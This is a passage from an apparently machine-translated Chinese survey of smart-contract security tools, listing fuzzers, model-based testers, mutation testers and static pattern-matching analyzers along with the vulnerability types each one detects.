ZEUS是一个正式的验证框架，旨在分析SCs的安全性。它于2018年推出，结合了抽象解释和符号模型检查来验证合同的正确性和公平性。ZEUS能够检查是否遵守安全编程实践和业务逻辑，检测漏洞，包括“重入性”、“未检查发送”、“整数溢出&#x2F;下溢”、“事务状态依赖”、“块状态依赖”和“TOD”。\n\n\n总之，形式化验证工具使用数学方法来验证sc的正确性和安全性。通过将契约转换为正式模型，这些工具有助于确保契约按预期执行。本节中提到的工具强调了在构建可靠和安全的sc时正式验证的重要性。\n4.7. “模糊”工具第七类工具强调模糊测试。模糊测试（fuzzing）是一种动态测试技术，它涉及提供无效的、意外的或随机的数据作为sc的输入，以发现编码错误和安全漏洞。这种方法对于识别漏洞和确保sc的健壮性特别有效。模糊测试工具通常结合符号执行和进化模糊测试等技术来生成有意义的事务序列，并为彻底的测试优化突变过程。为模糊测试开发的前20个工具侧重于漏洞检测，而其余10个工具是为sc中的漏洞识别而设计的。\n\n\n混淆检测器（Torres et al., 2021）：它是2021年为sc开发的混合模糊器，结合了符号执行和进化模糊。它使用约束求解复杂条件和动态数据依赖分析生成有意义的事务序列。它检测的漏洞包括“断言失败”、“整数溢出”、“可重入”、“TOD”、“块依赖”、“未处理的异常”、“不安全的委托调用”、“泄漏以太”、“锁定以太”和“无保护的自毁”。\nCrossFuzz-detector (Yang et al., 2024)：它是一个交叉合约模糊测试工具，用于检测2024年发布的以太坊sc中的漏洞。它通过跟踪数据传播路径生成构造函数参数，并利用契约间数据流优化事务序列突变。CrossFuzz可以检测一系列漏洞，包括“可重入性”、“未处理的异常”、“断言失败”和“块依赖”。\nEchidna-detector (Grieco et al., 2020)：这是一个SCs模糊器，它使用随机事务生成来检测违规行为，包括以太坊sc中的“重入”、“断言违规”、“气体限制问题”、“整数溢出和下溢”和“自定义属性违规”。它与Slither集成进行初始契约分析，然后运行模糊测试活动，利用应用程序二进制接口和常量。Echidna于2020年推出，擅长快速识别财产违规行为，估计天然气使用量，并以最少的配置支持各种开发框架。\nEF cf检测器（Rodler等人，2023年）：2023年推出的高性能模糊器将EVM字节码转换为本机C代码，以实现有效的模糊测试。它为SCs事务序列使用结构感知的突变引擎，并利用合约的ABI生成有效的输入。EF CF精确地模拟了复杂的交互，包括“可重入性”、“交叉契约交互”、“访问控制错误”、“整数溢出”、“委托调用滥用”和“组合可重入性”。\netherdifference - detector (Kim and Hwang, 2023)：它对以太坊节点的远程过程调用（RPC）服务执行差分测试。它使用并发事务和传播延迟生成非确定性链。于2023年发布，创建并执行测试用例以检测错误处理和返回值中的偏差，识别错误和不一致，包括“无效参数处理”，“气体估计差异”，“叔块访问不一致”，“实现错误（例如，崩溃和DOS）”，“方法支持不一致”和“字段和格式变化”。\nethploit检测器（Zhang et al., 2020b）：这是一个SCs漏洞生成器，它使用模糊测试结合静态污染分析来生成针对漏洞的事务。它采用动态种子策略和仪表EVM来处理区块链行为和约束。EtherDiffer检测漏洞，包括“崩溃bug”、“DoS bug”和合同执行的“错误气体估计”。\nEVMFuzzer-detector (Fu et al., 2019a)：它是一种差分模糊测试工具，用于检测EVM实现中的漏洞。它生成和改变种子契约，并在多个evm上运行它们，以识别执行差异。它使用动态优先级调度和基准evm作为交叉引用的oracle来有效地检测安全问题。EVMFuzzer于2019年开发，可检测包括“非法堆栈操作”、“DoS错误”和“分段错误”在内的漏洞。\nfuzzdelsol探测器（Smolka et al., 2023）：于2023年推出，它是Solana sc的二进制覆盖引导模糊器。它模拟运行时的细节，如sc交互，并生成事务来发现漏洞，包括“缺少签名者检查”、“缺少所有者检查”、“任意跨程序调用”、“缺少密钥检查”、“整数错误”和“lamport盗窃”。\nGasFuzzer-detector (Ashraf et al., 2020)：这是一种2020年设计的模糊测试工具，用于检测面向气体的异常安全漏洞，包括以太坊sc中的“异常紊乱”和“out- gas”。该工具采用了两阶段策略：一种是“贪气”策略，该策略优先考虑重气交易以进行突变；另一种是“气均衡”策略，该策略通过操纵气量来暴露漏洞。\nHFContractFuzzer-detector (Ding等人，2021)：它是一种用于检测Hyperledger Fabric sc漏洞的模糊测试工具。它使用Go -fuzz和用Go编写的sc，利用MockStub类的单元测试来模拟区块链状态。该工具于2021年开发，通过初始语料库和突变算法增强来优化模糊过程，有效识别漏洞，包括“类型转换错误”、“逻辑漏洞”和“整数溢出”。\nHydra - detector (Breidenbach et al., 2019): Hydra是2019年设计的一个框架，用于在以太坊sc上进行原则性的自动错误赏金。它将n个版本的编程与自动漏洞赏金支付相结合，运行多个版本的程序来检测和隔离漏洞。元程序协调行动以确保安全，通过赏金奖励激励披露。Hydra检测到的漏洞包括“逻辑错误”、“重入攻击”和其他可利用的漏洞，通过确保识别不同版本程序之间的差异，并奖励奖励以鼓励报告。\nIcyChecker-detector (Ye et al., 2023)：这是一个基于模糊的框架，设计于2023年，用于检测sc中的状态不一致（SI）错误。它重播链上的历史事务以收集准确的上下文信息，然后生成和改变事务序列，通过观察状态差异来识别SI错误。这种方法有效地揭示了分散应用程序中的“状态不一致错误”、“可重入性”、“提前运行”、“访问控制违规”和“坏随机性”等漏洞。\n基于不变量的稀缺性缺陷检测器（Sun et al., 2022）：该方法于2022年发表，使用不变量分析检测区块链数字资产的稀缺性缺陷。它将转移和交换不变量定义为测试oracle，并使用confzzius模糊测试工具生成测试输入，有效地识别sc中的“稀缺性缺陷”。\nILF检测器（He et al., 2019）： ILF于2019年开发，是用于以太坊sc的基于模仿学习的模糊器，结合了符号执行和模糊技术。ILF有效地检测诸如“泄漏”、“自杀”、“锁定”、“块依赖”、“未处理异常”和“受控委托调用”等漏洞。它从符号执行专家生成的输入中学习模糊策略，以提高代码覆盖率和漏洞检测。\nItyFuzz - detector (showet al., 2023)：发布于2023年，ItyFuzz是一个基于快照的以太坊sc模糊器。它用状态快照替换事务序列，以减少重新执行开销。该工具采用数据流和比较路径点对感兴趣的状态进行优先级排序，从而实现快速高效的漏洞检测。ItyFuzz可以识别漏洞，如“重入”，“整数溢出”，“时间戳依赖”，“气外”，“未处理的异常”和“短地址攻击”。\n语言不可知模糊框架检测器（Pani et al., 2022）：该框架于2022年推出，使用单个模糊器通过将其转换为低级虚拟机（LLVM） IR来检测用不同编程语言编写的sc中的漏洞。它采用美国模糊Lop （AFL）、Honggfuzz和libFuzzer来执行模糊测试，增强了企业开发和运营（DevOps）设置的可扩展性和可维护性。\nMagicMirror - detector (Feng et al., 2023): MagicMirror是2023年为sc设计的高覆盖率模糊测试工具。它将动态符号执行与传统模糊检测相结合，增强了对漏洞的检测能力。MagicMirror通过动态污点分析，确保全面的漏洞检测，有效缓解SCs中的“整数溢出”、“时间戳依赖”、“重入”、“未处理异常”、“out- gas”和“短地址攻击”等安全问题。\nReDefender - detector (Li et al., 2022d): ReDefender是一个全自动动态分析工具，旨在检测2022年推出的以太坊sc中的“重入漏洞”。使用模糊测试，它对契约进行预处理以创建候选池，生成模糊测试输入以模拟攻击，并分析执行日志以验证漏洞。\nseqfuzzy - detector (Ji et al., 2023)：它是2023年发布的用于SCs测试的引导突变模糊器，结合了动态依赖学习（DDL）和动态变量分析（DVA）。DDL通过分析状态变量依赖关系生成事务序列，而DVA使用动态分析处理外部参数。SeqFuzz通过关注相关的突变来增强分支覆盖和bug检测。SeqFuzz检测到的漏洞包括“任意写入”、“块状态依赖”、“控制劫持”、“以太泄漏”、“整数错误”、“错误处理异常”、“多次发送”、“可重入”、“自杀式合约”和“事务源使用”。\nsyntest - solid - detector (Olsthoorn et al., 2022)：开发于2022年，它是Solidity sc的自动化测试用例生成和模糊测试框架。它采用各种元启发式搜索算法，包括随机搜索和遗传算法，如非支配排序遗传算法II （NSGA-II）和动态多目标排序算法（DynaMOSA），以优化测试用例的生成。该工具提供了命令行界面和web服务，使开发人员可以轻松访问和使用。\nContractFuzzer - identifier (Jiang et al., 2018): ContractFuzzer于2018年推出，使用模糊测试技术来测试以太坊sc的漏洞。它生成要执行的随机输入契约和应用预定义的规则来识别漏洞，如“可重入性”、“时间戳依赖”、“整数溢出”、“未检查调用”、“异常无序”和“气不足”。这种方法通过模拟各种攻击场景来帮助识别潜在的安全问题\nEtherolic - identifier (Ashouri, 2020): Etherolic于2020年推出，是用于以太坊sc安全性分析的强大而高效的模糊测试工具。它结合了动态污染跟踪和聚合测试来分析字节码、识别漏洞并生成漏洞。Etherolic能够检测广泛的漏洞，如“整数溢出和下溢”，“坏随机性”，“重入”，“锁定以太”，“未处理异常”，“拒绝服务”，“短地址攻击”，“竞争条件”和“影子内存”，以及字节码级别的零日攻击，即使没有访问源代码，同时通过识别代码中的保护方法最大限度地减少误报。\nGFuzzer - identifier (Li et al., 2022e): GFuzzer于2022年发布，是EOSIO sc的灰盒模糊测试工具。它使用执行反馈来指导模糊测试并改进分支覆盖率。GFuzzer可以检测到“假EOS转账”、“伪造转账通知”、“区块信息依赖”等漏洞。采用基于距离的突变策略生成覆盖难以到达的分支的测试用例，确保全面的安全性分析。\n哈维识别器（w&lt;s:1&gt; stholz和Christakis， 2020）：哈维是一种为sc设计的灰盒模糊器，于2020年推出。它通过预测可能覆盖新路径或暴露漏洞的新输入来增强标准的灰盒模糊测试。Harvey还模糊了事务序列，以探索不同的合约状态，旨在检测诸如“断言违规”和“内存访问错误”等漏洞。使用公共数据集来证明其有效性。\nNeoDiff - identifier (Maier et al., 2021): NeoDiff是SCs虚拟机的微分模糊测试框架。它于2021年发布，使用覆盖引导和状态引导模糊测试来探索虚拟机行为并发现关键差异。NeoDiff已应用于各种区块链平台，包括以太坊和Neo，发现差异和“内存损坏问题”。该工具可以轻松地移植到新的sc平台。\nguard - identifier (Liu et al., 2018a): ReGuard是一种基于模糊的分析仪，用于自动检测以太坊sc中的“重入错误”。它通过生成随机和多样化的事务来执行模糊测试，然后根据运行时跟踪动态识别可重入漏洞。ReGuard于2018年发布，将sc代码转换为C语言进行全面分析。\nRLF - identifier (Su et al., 2022)：强化学习模糊器（RLF）于2022年开发，是一种强化学习引导的模糊测试工具，旨在在以太坊sc中生成易受攻击的交易序列。通过将模糊过程建模为马尔可夫决策过程，RLF有效地识别需要特定事务序列的复杂漏洞。它集成了漏洞和代码覆盖奖励来检测多种类型的漏洞，包括“以太坊泄漏”、“自杀式契约”、“块状态依赖”、“未处理的异常”、“危险的delegatcall”和“以太坊冻结”，特别是涉及多个功能交互的漏洞。\nSMARTIAN - identifier (Choi et al., 2021)：物联网和网络应用的符号模型分析推理工具（SMARTIAN）是一种SCs模糊器，通过静态和动态数据流分析增强模糊。该系统于2021年推出，系统生成关键事务序列，查找“断言失败”、“任意写入”、“块状态依赖”、“控制流劫持”、“以太坊泄漏”、“冻结以太坊”、“整数bug”、“错误处理异常”、“可重入性”、“需求违反”和“自杀式契约”，利用数据依赖来指导模糊测试。这种混合方法显著提高了bug检测和代码覆盖率。\nsFuzz - identifier (Nguyen et al., 2020): sFuzz是以太坊平台上Solidity sc的自适应模糊测试工具。它将基于afl的模糊测试与轻量级的自适应策略集成在一起，以实现高代码覆盖率并发现漏洞。该工具于2020年推出，通过优化的反馈引导流程生成和执行大量测试用例，有效识别包括“无气发送”、“异常无序”、“可重入”、“时间戳依赖”、“块号依赖”、“危险的委派调用”、“整数溢出&#x2F;下溢”和“冻结以太”在内的问题。\nWASAIUP - identifier (Wang et ., 2023): WASAIUP于2023年推出，是用于EOSIO sc的需求驱动型concolic zzzzer。它可以检测特定的漏洞，包括“假EOS”、“假通知”、“回滚”、“缺少授权验证”和“blockinfo依赖”。这种混合工具结合了符号和具体执行，以提高检测效率和准确性。\n\n\n总体而言，模糊测试工具提供了一种自适应方法，通过生成多样化和不可预测的输入来识别SCs中的漏洞。尽管模糊测试有局限性，比如大量的计算资源和潜在的覆盖缺口，但它仍然是在意外条件和边缘情况下测试合同的有效方法。这里强调的工具展示了模糊测试在提高sc安全性方面的价值\n4.8. “基于模型的测试”工具第八类使用基于模型的测试。该方法包括创建SCs的抽象模型，以指导测试用例的生成并验证契约行为。使用正式模型和状态机，这些工具可以系统地探索不同的执行路径并检测潜在问题，从而确保sc的彻底测试和验证。在下面的工具列表中，前五个工具利用抽象解释进行漏洞检测，而其余六个工具用于sc中的漏洞识别。\n\n\nADF-GA检测器（Zhang et al., 2020c）：基于遗传算法的自适应模糊（ADF-GA）是一种基于遗传算法的方法，用于生成Solidity sc的测试用例。ADF-GA于2020年推出，可构建控制流图，执行数据流分析以识别变量用途，并通过改进的适应度函数优化测试生成。ADF-GA检测漏洞，如“重入错误”，“不正确的状态转换”和“整数溢出&#x2F;下溢问题”。\nFSolidM检测器（Mavridou和Laszka， 2018）： FSolidM于2018年开发，是一个旨在使用有限状态机（FSMs）创建安全以太坊sc的框架。它包括一个指定fsm的图形化编辑器，一个用于生成Solidity代码的代码生成器，以及增强安全性和功能的插件。然而，由于FSolidM专注于帮助开发人员创建安全合约，而不是检测现有合约中的漏洞，因此它不包括在本次调查的工具理论和实践分析中。FSolidM通过提供一个正式的模型、减少手工编码错误、集成常见的安全模式（如“重入”、“事务排序”和“访问控制”）来帮助开发人员。\nModCon-detector (Liu et al., 2020)：它是一个基于模型的测试平台，适用于无许可和许可区块链上的sc。它使用用户指定的模型来定义测试oracle，指导测试生成，并度量测试的充分性。通过基于web的界面，ModCon支持定制的测试过程。通过指定状态定义、转换关系和前后条件，彻底验证复杂sc。ModCon于2020年开发，可检测复杂SCs应用中的“状态转换错误”、“功能正确性问题”和安全漏洞。\nSCs建模和行为验证检测器（Abdellatif和brussmiche， 2018）：该工具使用基于行为交互优先级的形式化建模方法来验证SCs行为。它于2018年推出，对sc、用户和区块链交互进行建模，通过统计模型检查来识别潜在的漏洞。模拟不同的攻击场景可以深入了解安全漏洞，并为健壮的SC实现提供设计改进建议。它可以检测漏洞，包括“事务重排序攻击”、“待处理事务数据泄漏”和“网络窃听”。\nSmartInspect-detector (Bragagnolo等人，2018)：它是一个Solidity SCs检查器，使用反编译技术和基于镜像的架构来表示和解释合同状态。它于2018年开发，反编译合约的二进制结构并将其映射到源代码，允许开发人员检查和理解合约状态，而无需重新部署或额外的代码。\nElysium - identifier (Ferreira Torres et al., 2022): Elysium是2022年推出的字节码级补丁工具，用于自动修复sc中的漏洞。它集成了Osiris、Oyente和Mythril来检测和修补诸如“整数溢出”、“可重入性”和“未处理的异常”等问题。使用CFG和污染分析，Elysium生成有效的补丁。该工具解决了七种类型的漏洞，包括“同函数重入”、“跨函数重入”、“delegatcall滥用”、“基于创建的重入”、“事务起源”、“自杀式合约”和“整数溢出和下溢”，并可在GitHub上获得。\nESAF - identifier (Vivar et al., 2021)：以太坊安全分析框架（ESAF）于2021年推出，是一个综合框架，集成了多个现有的sc漏洞分析工具。它通过统一输出格式和通过容器化管理依赖关系来简化分析过程。ESAF支持持久的安全监控和单独的漏洞分析，利用了Oyente、Mythril和Securify等工具的组合功能。\nSecSEC - identifier (Yashavant, 2024): secure Smart Ethereum Contracts （SecSEC）于2024年推出，使用逻辑回归集成了多个sc分析工具，以增强漏洞检测。这种混合方法结合了各种工具的优势，并在标有漏洞的现实世界合同的大型数据集上进行训练。\nSmartBugs - identifier (Ferreira et al., 2020): SmartBugs是一个可扩展的执行框架，旨在简化Solidity sc的分析。它于2020年开发，支持多种分析工具和数据集，实现可重复研究和全面漏洞检测。SmartBugs集成了HoneyBadger、Maian和Mythril等工具，并提供了各种漏洞类型的详细报告，如“重入”、“整数溢出和下溢”、“未检查发送”、“拒绝服务（DoS）”、“时间戳依赖”、“TOD&#x2F;提前运行”、“未初始化存储指针”、“tx”。“原始身份验证”，“锁定醚”，“访问控制问题”和“坏随机性”使用Docker镜像和用户友好的命令行界面。\nSmartBugs 2.0 - identifier (Ferreira et al., 2020): SmartBugs 2.0是一个用于自动分析以太坊sc的执行框架。它于2023年发布，集成了19个分析工具，并支持Solidity源代码和EVM字节码。该框架检测各种漏洞，包括“可重入性”、“算术问题（溢出&#x2F;下溢）”、“访问控制违规”、“未检查的低级调用”、“拒绝服务”、“恶意随机性”、“时间戳依赖性”、“提前运行”、“短地址攻击”、“未检查返回值”、“不安全的delegatecall使用”、“整数错误”、“gas消耗问题”、“身份验证绕过”、“断言违规”、“事务源使用”、“竞争条件”、“遮蔽变量”和“自杀式合同”。该框架将输出格式标准化，并将结果映射到SWC分类法，从而促进大规模、可重复的分析。\nSoliAudit - identifier (Liao et al., 2019): SoliAudit是一种SCs漏洞评估工具，结合了机器学习和模糊测试。它于2019年推出，可以检测13种类型的漏洞，包括“重入性”、“算术溢出”、“访问控制”、“未检查的低级调用”、“拒绝服务”、“坏随机性”、“提前运行”、“时间操纵”、“短地址”、“调用深度”、“事务起源”、“内联汇编”和“自毁”，而不需要专家知识或预定义模式。solidaudit采用静态机器学习分类器，使用solididity机器代码特征和动态模糊器进行在线交易验证。\n\n\n基于模型的测试工具提供了一种使用抽象模型和状态机分析SCs的结构化方法。虽然构建这些模型可能很耗时，但它们可以通过探索各种执行路径来帮助确保sc按预期工作。讨论的工具说明了基于模型的测试如何提高SC的可靠性。\n4.9. “突变测试”工具第九类使用突变检测。该技术涉及在sc的源代码中引入小的、有意的更改或突变，以模拟潜在的错误。然后对修改后的契约或突变进行测试，以确定现有的测试套件是否可以检测并处理这些错误。这个过程有助于提高测试套件的有效性和彻底性。下面列出的工具利用突变测试，前三个是检测工具，其余两个用于SCs中的识别目的。\n\n\nRegularMutator - detector (Ivanova and Khritankov, 2020): RegularMutator于2020年推出，是一种针对Solidity SCs的突变检测工具。它使用正则表达式通过在源代码中引入常见错误来创建突变。然后，根据测试套件检测这些突变的能力来评估测试套件的有效性。通过检测额外的缺陷，并提供比线路覆盖度量更可靠的评估，该工具被证明在提高测试套件的质量方面是有效的。\nReSuMo - detector (Barboni et al., 2024): ReSuMo，发表于2023年，是Solidity SCs的回归突变测试工具。它使用静态和文件级技术来选择要突变的sc子集和要在回归突变测试活动期间重新运行的测试文件子集。通过使用以前的测试结果增量地更新结果，ReSuMo加速了演进项目的突变测试过程，同时确保了全面的充分性评估。\nSuMo - detector (Barboni et al., 2022): SuMo是一种用solid编写的SCs突变检测工具。它支持独立的命令行界面和带有REST API的web服务，以最小的工作量实现自动化的突变测试。《SuMo》于2022年出版，使用了44种不同的突变操作者，并与松露和Ganache集成编写和测试SCs，提供了关于突变测试过程和结果的全面报告。\nMuRE - identifier (Zhu et al., 2023): 2023年引入的可重入检测工具Evaluation （MuRE）的突变测试方法，采用突变测试在以太坊sc中生成分类的“可重入”漏洞集。它使用符号执行来识别潜在的可重入路径，并应用突变操作符来生成可重入突变。MuRE通过比较重入检测工具检测这些分类突变的能力来评估它们的有效性。\nMuSC - identifier (Li et al., 2019)：以太坊sc （MuSC）突变测试工具于2019年推出，专注于突变测试，以评估sc测试的稳健性。它使用一组为Solidity量身定制的新颖突变操作符生成突变，并执行自动操作，如创建测试网、部署和执行测试。该工具通过修改代码的特定部分来评估测试覆盖率和有效性，从而帮助暴露SCs中的各种缺陷。\n\n\n总之，突变测试工具为评估和提高SCs测试套件的质量提供了一个框架。突变测试引入了受控的修改，并评估测试是否可以捕获这些错误。这种方法衡量测试覆盖率，揭示测试中的漏洞，提高sc的整体可靠性和安全性。\n4.10. “模式匹配和语法分析”工具第十类使用模式匹配和语法分析。该方法包括分析SCs的结构和语法，以识别模式并检测潜在的漏洞。通过利用预定义的模式和语法规则，这些工具可以有效地发现契约中的安全风险和编码问题。在下面使用模式匹配和语法分析的工具中，前14个是针对漏洞检测的，而其余21个侧重于sc内的漏洞识别。\n\n\nDeFiRanger-detector (Wu et al., 2023)：它是去中心化金融（DeFi）应用程序中价格操纵攻击的检测工具。它于2023年发布，从原始交易构建现金流树（CFT），将低级语义提升到高级语义，并应用预定义模式来检测“价格操纵攻击”。\nEthlint - detector (Dua, 2024): Ethlint，最初被称为Solium，于2016年开发，是一个用JavaScript实现的静态分析工具，用于检查Solidity代码的风格和安全问题。它标准化了跨组织的sc实践，并与构建系统无缝集成。Ethlint提供了一个易于使用的命令行界面（CLI）来检测Solidity文件，支持多种输出格式和自动代码修复。\nHorus-detector (Ferreira Torres et al., 2021)：于2021年开发，它通过利用逻辑驱动和图形驱动的方法自动检测和分析对以太坊sc的攻击。它从交易中提取与执行相关的信息，使用Datalog查询识别攻击，并使用图形数据库跟踪被盗资产。在Python中实现，Horus提供了对安全问题的详细见解，促进了攻击识别和分析。\nMSmart - detector (Fei et al., 2023): MSmart通过引入额外规则和改进现有规则来增强Smartcheck静态分析工具，以检测2023年开发的Solidity sc中的漏洞。它可以识别诸如“整数溢出”、“时间戳依赖”、“自毁”、“delegatcall”和“DOS”等问题，同时支持批量检测以简化大型数据集的分析。\nNaga检测器（Yan et al., 2023）： Naga是2023年设计的一种工具，用于检测分散生态系统中的“集中安全风险”，专门针对以太坊加密钱包和sc。它使用ir进行数据依赖性分析，识别和分析七个集中的安全风险。\nSafelyAdministrated-detector (Ivanov et al., 2021)：该工具于2021年推出，使用基于九个语法特征的模式识别来识别以太坊主网上受管理的以太坊请求评论20 （ERC20）令牌。该工具全面分析和分类管理令牌，以突出其普遍性和相关的危险。SafelyAdministrated检测到的具体漏洞包括“自毁”、“合约弃用”、“地址更改”、“参数更改”和“挖矿和焚烧能力”。\nSCGraphs - detector (Zhang et al., 2023c)：语义契约图（Semantic Contract Graphs, SCGraphs）于2023年发布，是一种基于Weisfeiler-Lehman图核，使用语义契约图和近似图匹配的SCs漏洞检测工具。它从sc构建scgraph，然后计算相似矩阵来检测漏洞，如“重入性”、“时间戳依赖性”、“delegatcall误用”和“整数溢出”。该工具从手动审计的契约中构建一个漏洞scgraph库，这有助于识别新的漏洞。\nSIF检测器（Peng et al., 2019）： Solidity Instrumentation Framework （SIF）是一个用于在AST上运行的Solidity合约分析和仪器的框架，它可以查询、修改和生成Solidity合约的代码。SIF包括功能列表、调用图生成、控制流图生成和故障播种工具，便于进行深度安全性和优化分析。SIF于2019年发布，可检测包括“除零”、“溢出”和“下溢”等漏洞。\nSolChecker - detector (Dong et al., 2022): SolChecker于2022年开发，是一种自动静态分析工具，用于查找Solidity sc中的漏洞。它使用AST来分析代码的控制和数据流。通过对47000多个真实世界的合约进行检查，SolChecker在检测常见的安全问题方面显示了其有效性，包括“未初始化变量”、“恶意地址”、“函数返回默认值”、“直接更改数组长度”、“滥用块信息”、“可重入”、“未初始化存储变量”、“未检查发送和调用”、“先除后乘”、“构造函数名称错误”、“平衡严格相等”和“滥用txt .origin”。\nSolhint - detector (Protofire, 2024): Solhint是Solidity代码的开源检查工具，提供安全性和风格指南验证。它提供了一系列可以通过配置文件定制的规则，以强制执行编码标准并检测潜在问题。2017年推出的Solhint可以自动修复某些问题\nSolGuard - detector (Praitheeshan et al., 2021): SolGuard是一个安全分析插件，与Solhint linter集成，用于检测Solidity sc中的“外部呼叫问题”。它于2021年开发，定义了三条安全规则：检查状态变量声明的顺序，避免构造函数中的地址参数，以及确保回退函数。\nTokenScope - detector (Chen et al., 2019): TokenScope是2019年设计的一种工具，用于检测以太坊加密货币令牌中的不一致行为。它通过对比源自核心数据结构、标准接口和标准事件的行为，检查令牌与用户和第三方工具之间的交互。TokenScope的分析涵盖了7472个令牌，并识别了3,259,001个触发不一致的交易，揭示了诸如“整数溢出”，“假存款”，“缺乏标准事件”，“不正确的余额更新”和“不匹配的令牌转移行为”等缺陷。\nUBF-ChaincodeScan - detector （Shah等人，2023年）：Universal区块链Framework Chaincode Scanner （UBF ChaincodeScan）检测2023年发布的Hyperledger Fabric中基于node .js的sc中的漏洞。它具有两阶段架构：验证和扫描。验证阶段包括脚本命令验证、sc语言识别和语法验证，而扫描阶段执行扫描并生成JSON格式的报告。UBF-ChaincodeScan可以识别诸如“全局变量”、“随机数生成器”、“系统命令执行”、“外部文件库”、“未检查错误”、“范围查询风险”、“读写冲突”和“外部API”等问题。\nVulpedia - detector (Ye et al., 2022)：开发于2022年的Vulpedia是一个静态分析工具，它使用抽象的漏洞签名来检测以太坊sc中的“Reentrancy”、“滥用text .origin”、“Unexpected Revert”和“self - destructing Abuse”等安全问题。将脆弱签名和良性签名结合，形成检测规则。\nAChecker - identifier (Ghaleb et al., 2023): AChecker于2023年推出，是一种用于静态检测sc中的“访问控制漏洞”的工具。与以前的方法不同，AChecker通过静态数据流分析推断访问控制机制，并使用基于符号的分析来区分预期功能和实际漏洞。\nCloudAudit-identifier (Lai和Luo， 2020)：该工具于2020年提出，使用基于XPath模式的静态分析来检测Solidity sc中的“整数溢出漏洞”。通过在11种类型的整数溢出特性中定义83种XPath模式，该工具可以有效地识别诸如“乘法”、“加法”和“减法溢出”之类的漏洞。\nEOSIOAnalyzer - identifier (Li et al., 2022a): EOSIOAnalyzer于2022年提出，是一个静态分析框架，用于检测EOSIO sc中的漏洞。它识别了“虚假EOS转账”、“伪造转账通知”和“区块信息依赖”等漏洞。该工具将Wasm字节码转换为高级中间表示，并应用上下文敏感的数据流分析算法。\n基于图嵌入的字节码匹配工具-标识符（Huang et al., 2021）：该工具于2021年推出，使用图嵌入和字节码匹配技术检测sc中的漏洞。它对契约字节码进行规范化和切片，以便在已知漏洞和目标契约之间进行精确的相似性度量。该工具可以识别诸如“整数溢出”、“可重入性”、“坏随机性”、“未受保护的所有权”和“处理不当的异常”等漏洞。\n基于匹配规则的SCs审计工具-标识符（Li et al., 2020）：该审计工具于2020年开发，利用匹配规则来评估SCs漏洞。它匹配每个漏洞类型向量来分配威胁级别（高、中、低），并生成一个全面的审计报告。可扩展的工具允许审计人员自定义和添加新规则来处理新出现的威胁。它通过匹配sc中的特定代码模式来检测诸如“重入”、“整数溢出”、“时间戳依赖”和“权限盗窃”等漏洞。\nNeuCheck - identifier (Lu et al., 2021): NeuCheck于2019年推出，使用基于语法树的方法将源代码转换为中间表示，避免语义丢失。它检测各种漏洞，包括“访问控制漏洞”、“可重入漏洞”、“哈希冲突漏洞”、“整数溢出漏洞”、“依赖可预测变量漏洞”。与Securify和Mythril等其他工具相比，NeuCheck提高了分析速度和跨平台部署。\nRemix Solidity静态分析插件标识符（Mohanty and Anand, 2023）：这个静态分析工具集成到Remix IDE中，用于检测Solidity sc中的漏洞。它支持安全、天然气、经济等21个分析模块。在2023年进行评估时，它可以检测“访问控制”、“算术”、“坏随机性”、“拒绝服务”、“提前运行”、“重入”、“短地址”、“时间操纵”和“未检查的低级调用”，在其他漏洞中表现一般。与其他命令行工具相比，该工具的图形用户界面（GUI）使其用户友好。\nSafeCheck - identifier (Chen et al., 2024): SafeCheck是2024年推出的静态分析工具，用于检测以太坊sc中的六种类型的漏洞，包括“重入性”。“时间戳依赖”、“危险的委托调用”、“DoS”、“自毁”和“TOD”。它将契约字节码转换为中间表示提取语义信息，并采用基于datalog的规则进行漏洞检测。\nSASC - identifier (Zhou et al., 2018a): Static Analysis for SCs (SASC)，于2018年开发，是以太坊sc的静态分析工具，专注于拓扑分析和逻辑风险检测。它识别诸如“调用堆栈风险”、“交易顺序风险”、“重入风险”、“时间戳风险”、“tx”等风险。原产地风险”和“零分割风险”。SASC提供HTML格式的详细报告，帮助开发人员减轻漏洞。\nSmartAnvil - identifier (Ducasse et al., 2019): SmartAnvil于2019年推出，是一个用于SCs分析的开源平台。它利用静态分析、部署合约二进制分析和区块链导航来检测Solidity sc中的漏洞。该平台支持各种组件，如用于解析的SmaccSol、用于语义分析的SmartGraph和用于实时状态检查的SmartInspect，可以有效地识别诸如“语义错误”之类的问题。\nSmartCheck - identifier (Tikhomirov等人，2018):SmartCheck是以太坊sc的静态分析工具。该工具于2018年推出，将Solidity代码转换为基于xml的中间表示形式，并根据XPath模式对其进行检查，以检测各种代码问题，包括“余额相等”、“未经检查的外部调用”、“外部合约DoS”、“发送而不是传输”、“可重入”、“恶意库”、“使用txt .origin”、“转发所有gas”、“整数除法”、“锁定货币”、“未经检查的数学”、“时间戳依赖”、“不安全的类型推断”、“字节数组”、“昂贵循环”、“令牌API冲突”、“编译器版本未固定”、“私有修饰符”、“冗余回退函数”和“样式指南冲突”。\nSmartDagger - identifier (Liao et al., 2022): SmartDagger是一种基于字节码的静态分析工具，旨在检测以太坊sc中的“交叉合约漏洞”。它于2022年发布，集成了从字节码中恢复合约属性信息的新机制，准确识别跨合约交互期间的漏洞。SmartDagger选择性地分析功能子集，重用数据流结果以提高效率。\nSmartmuv - identifier (Ayub et al., 2023): Smartmuv是一个基于源代码的自动静态分析工具，用于分析和提取以太坊sc的存储状态。它于2022年开发，使用ast和CFGS来分析状态变量，包括沿着继承层次结构的映射类型。该工具确保准确的存储状态提取，促进sc的无缝升级和迁移。\nSoliDetector - identifier (Hu et al., 2024): SoliDetector是Solidity sc的静态缺陷检测工具，利用知识图来捕获代码中的语法和逻辑关系。它于2023年推出，支持检测20种缺陷，包括“可重入性”、“整数溢出”、“处理不当的异常”、“外部合约DoS”、“使用txt .origin进行认证”、“构造函数缺失”、“锁定货币”、“不安全类型推断”、“时间戳依赖”、“令牌API违规”、“私有修饰符”、“冗余拒绝付款”、“编译器版本问题”、“样式指南违规”、“整数除法”、“隐式可见性级别”、“平衡平等”、“昂贵循环”、“使用定点数字类型”和“byte[]”，使用SPARQL查询来推断复杂关系并准确地定位缺陷。\nSolidityCheck - identifier (Zhang et al., 2019b): SolidityCheck是一个工具，旨在使用正则表达式检测soliditysc中的各种问题。它于2019年推出，确定了20个问题，包括可重入性和整数溢出等安全漏洞。SolidityCheck使用常规匹配和程序检测来快速准确地定位源代码中的问题语句。\nSolidity漏洞扫描器-标识符（Ramakrishnan et al., 2022）： Solidity漏洞扫描器是一个静态分析工具，旨在识别和分类Solidity 